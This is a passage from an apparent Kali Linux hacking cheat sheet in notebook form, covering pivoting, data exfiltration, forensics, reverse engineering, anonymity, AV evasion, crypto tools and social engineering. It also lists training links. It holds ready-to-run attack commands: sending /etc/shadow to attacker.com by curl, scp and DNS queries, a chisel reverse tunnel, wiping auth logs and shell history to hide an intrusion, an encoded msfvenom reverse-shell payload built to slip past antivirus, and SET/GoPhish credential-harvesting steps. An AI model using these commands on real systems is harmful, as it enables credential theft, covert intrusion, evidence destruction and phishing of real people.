		  # SSH local port forward (access internal host via pivot)
		  ssh -L 8080:192.168.2.10:80 user@pivot_host
		  # Dynamic SOCKS proxy
		  ssh -D 1080 user@pivot_host
		  proxychains nmap 192.168.2.0/24
		  # Chisel (no SSH needed)
		  # Attacker: chisel server -p 8000 --reverse
		  # Victim:   chisel client attacker:8000 R:1080:socks
		  # Metasploit route
		  route add 192.168.2.0/24 SESSION_ID
		  ```
	- ## Data Exfiltration
		- ```bash
		  curl -X POST http://attacker.com/upload -F "file=@/etc/shadow"
		  base64 /etc/shadow | curl -d @- http://attacker.com/
		  scp /etc/shadow attacker@attacker.com:/loot/
		  # DNS exfil: encode data in DNS queries
		  cat /etc/passwd | xxd -p | while read l; do dig $l.attacker.com; done
		  ```

- # Forensics & Steganography
  collapsed:: true
	- ## Disk Forensics
		- ```bash
		  dd if=/dev/sdb of=disk.img bs=4M status=progress   # forensic image
		  dcfldd if=/dev/sdb of=disk.img hash=md5 hashlog=hash.txt
		  mount -o ro,loop disk.img /mnt/evidence             # read-only mount
		  autopsy                            # GUI forensics (localhost:9999)
		  foremost -i disk.img -o recovered/ # recover by file header
		  photorec disk.img                  # recover photos + docs
		  strings binary | grep -i "pass\|key\|secret"
		  ```
	- ## Steganography
		- ```bash
		  steghide embed -cf image.jpg -sf secret.txt -p password
		  steghide extract -sf image.jpg -p password
		  stegseek image.jpg /usr/share/wordlists/rockyou.txt  # crack steghide
		  binwalk image.jpg                  # analyze embedded files
		  binwalk -e image.jpg               # extract embedded files
		  exiftool image.jpg                 # show metadata
		  exiftool -all= image.jpg           # strip all metadata
		  zsteg image.png                    # detect hidden data in PNG
		  ```

- # Reverse Engineering
  collapsed:: true
	- ## Static Analysis
		- ```bash
		  file binary                        # type + architecture
		  strings binary | grep -i "pass\|key\|url\|http"
		  xxd binary | head -50              # hex dump
		  readelf -h binary                  # ELF header
		  readelf -d binary                  # dynamic dependencies
		  objdump -d -M intel binary         # disassemble (Intel syntax)
		  nm binary                          # symbol table
		  ldd binary                         # shared library deps
		  ```
	- ## Dynamic Analysis
		- ```bash
		  strace ./binary                    # trace system calls
		  strace -e trace=open,read,write ./binary
		  ltrace ./binary                    # trace library calls
		  # GDB
		  gdb ./binary
		  # run  break main  next  step  continue
		  # info registers  x/20x $esp  disassemble main
		  # set disassembly-flavor intel
		  ```
	- ## Ghidra
		- ```
		  Launch: ghidraRun
		  File → New Project → Import File → Auto Analyze
		  Symbol Tree → Functions → find main()
		  Decompiler: assembly → C pseudocode
		  Features: cross-references, rename vars, patch bytes, scripting
		  ```
	- ## radare2
		- ```bash
		  r2 binary                          # open
		  aaa                                # analyze all
		  afl                                # list functions
		  pdf @main                          # disassemble main
		  VV                                 # visual graph mode
		  iz                                 # strings in data section
		  ```

- # Anonymity & Evasion
  collapsed:: true
	- ## Tor & Proxychains
		- ```bash
		  apt install tor && systemctl start tor
		  # /etc/proxychains4.conf → add: socks5 127.0.0.1 9050
		  proxychains nmap -sT -Pn target
		  proxychains curl https://api.ipify.org   # verify exit IP
		  proxychains sqlmap -u "http://target.com/page?id=1"
		  ```
	- ## MAC Spoofing
		- ```bash
		  ip link set eth0 down
		  ip link set eth0 address 00:11:22:33:44:55
		  ip link set eth0 up
		  macchanger -r eth0                 # random MAC
		  macchanger --permanent eth0        # restore original
		  ```
	- ## Clearing Tracks
		- ```bash
		  history -c && cat /dev/null > ~/.bash_history
		  unset HISTFILE                     # disable history this session
		  cat /dev/null > /var/log/auth.log  # clear auth log (root)
		  sed -i '/192.168.1.100/d' /var/log/auth.log  # remove your IP
		  journalctl --vacuum-time=1s        # clear all journal logs
		  touch -t 202001010000 file         # change file timestamp
		  ```
	- ## AV Evasion
		- ```bash
		  # Encode payload
		  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
		  # Veil Framework
		  apt install veil && veil
		  # Shellter (inject into legit PE)
		  apt install shellter && shellter
		  # Check detection: https://antiscan.me (NOT VirusTotal for ops)
		  ```

- # Cryptography Tools
  collapsed:: true
	- ## Hash Identification
		- ```bash
		  hash-identifier                    # interactive
		  hashid hash_value                  # identify type
		  hashid -m hash_value               # show hashcat mode
		  # MD5=32hex  SHA1=40hex  SHA256=64hex  bcrypt=$2a$  NTLM=32hex
		  # Online: crackstation.net  hashes.com
		  ```
	- ## OpenSSL
		- ```bash
		  openssl genrsa -out private.key 2048
		  openssl req -new -x509 -key private.key -out cert.pem -days 365
		  openssl enc -aes-256-cbc -in file.txt -out file.enc -k password
		  openssl enc -d -aes-256-cbc -in file.enc -out file.txt -k password
		  openssl dgst -sha256 file.txt
		  openssl base64 -in file.txt -out file.b64
		  openssl s_client -connect target.com:443   # inspect SSL cert
		  ```
	- ## GPG
		- ```bash
		  gpg --gen-key
		  gpg --encrypt --recipient "email@example.com" file.txt
		  gpg --decrypt file.txt.gpg > file.txt
		  gpg --sign file.txt && gpg --verify file.txt.gpg
		  ```

- # Social Engineering Tools
  collapsed:: true
	- ## SET — Social Engineering Toolkit
		- ```bash
		  setoolkit                          # launch (requires root)
		  # 1 → Social-Engineering Attacks
		  #   2 → Website Attack Vectors
		  #     3 → Credential Harvester Attack Method
		  #       2 → Site Cloner → enter target URL
		  # Victims enter creds → captured in SET console
		  ```
	- ## GoPhish (Phishing Campaigns)
		- ```bash
		  # Download from github.com/gophish/gophish/releases
		  chmod +x gophish && ./gophish
		  # Admin panel: https://localhost:3333 (admin/gophish)
		  # Workflow: Sending Profile → Email Template → Landing Page → User Group → Launch Campaign
		  # Tracks: opens, clicks, submitted credentials
		  ```

- # More Learn
	- ## Official Resources
		- [Kali Linux Official Docs](https://www.kali.org/docs/)
		- [Kali Linux Tool Listings](https://www.kali.org/tools/)
		- [Offensive Security Training](https://www.offensive-security.com/)
		- [GTFOBins – SUID/sudo privesc](https://gtfobins.github.io/)
		- [HackTricks – Pentest Cheatsheet](https://book.hacktricks.xyz/)
		- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
		- [LOLBAS – Living Off The Land Binaries (Windows)](https://lolbas-project.github.io/)
	-
	- ## Practice Platforms
		- [TryHackMe – Beginner Friendly 🎯](https://tryhackme.com/)
		- [HackTheBox – Intermediate/Advanced](https://www.hackthebox.com/)
		- [VulnHub – Offline VMs](https://www.vulnhub.com/)
		- [OverTheWire – Wargames](https://overthewire.org/wargames/)
		- [PicoCTF – CTF for beginners](https://picoctf.org/)
		- [PortSwigger Web Security Academy – Free web hacking labs](https://portswigger.net/web-security)
	-
	- ## Github & Webs
		- [Awesome Hacking Resources](https://github.com/vitalysim/Awesome-Hacking-Resources)
		- [PEASS-ng (LinPEAS/WinPEAS)](https://github.com/carlospolop/PEASS-ng)
		- [SecLists – Wordlists & Payloads](https://github.com/danielmiessler/SecLists)
		- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
		- [Impacket – Windows protocol tools](https://github.com/fortra/impacket)
		- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
	-
	- ## Master Playlists YouTube 📺 Free
		- [Kali Linux Full Course – NetworkChuck 🐧](https://www.youtube.com/watch?v=lZAoFs75_cs)
		- [Ethical Hacking Full Course – freeCodeCamp 🔐](https://www.youtube.com/watch?v=3Kq1MIfTWCE)
		- [TryHackMe Walkthroughs – John Hammond 🎯](https://www.youtube.com/@JohnHammond)
		- [IppSec – HackTheBox Walkthroughs](https://www.youtube.com/@ippsec)
